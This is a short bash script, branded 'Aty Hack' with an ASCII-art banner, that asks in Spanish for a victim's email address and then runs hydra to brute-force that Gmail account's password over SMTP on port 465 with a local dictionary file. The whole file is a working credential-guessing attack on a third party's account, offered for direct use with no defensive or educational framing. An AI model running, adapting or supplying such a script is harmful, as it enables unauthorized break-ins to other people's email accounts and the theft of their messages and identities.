#!/bin/bash


echo ' 

 

  /$$$$$$    /$$                     /$$   /$$                     /$$      
 /$$__  $$  | $$                    | $$  | $$                    | $$      
| $$  \ $$ /$$$$$$   /$$   /$$      | $$  | $$  /$$$$$$   /$$$$$$$| $$   /$$
| $$$$$$$$|_  $$_/  | $$  | $$      | $$$$$$$$ |____  $$ /$$_____/| $$  /$$/
| $$__  $$  | $$    | $$  | $$      | $$__  $$  /$$$$$$$| $$      | $$$$$$/ 
| $$  | $$  | $$ /$$| $$  | $$      | $$  | $$ /$$__  $$| $$      | $$_  $$ 
| $$  | $$  |  $$$$/|  $$$$$$$      | $$  | $$|  $$$$$$$|  $$$$$$$| $$ \  $$
|__/  |__/   \___/   \____  $$      |__/  |__/ \_______/ \_______/|__/  \__/
                     /$$  | $$                                              
                    |  $$$$$$/                                              
                    \______/                                                
                                                                                 
================================================================================

' 
echo '-Introduzca el email de la victima:'
read gmail

hydra -S -l $gmail -P /root/HACKS/diccionarios/diccionario.txt -v -V -e ns -s 465 smtp.gmail.com smtp
